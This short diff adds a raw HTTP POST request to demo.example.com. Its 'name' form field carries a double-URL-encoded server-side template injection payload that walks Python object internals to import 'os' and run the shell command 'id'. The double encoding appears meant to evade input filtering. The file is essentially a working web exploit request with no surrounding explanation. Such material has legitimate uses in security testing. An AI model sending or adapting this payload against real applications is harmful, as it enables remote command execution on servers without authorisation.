@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Connection: close
+
+name=%257B%257Bself.__init__.__globals__.__builtins__.__import__%2528%2527os%2527%2529.popen%2528%2527id%2527%2529.read%2528%2529%257D%257D
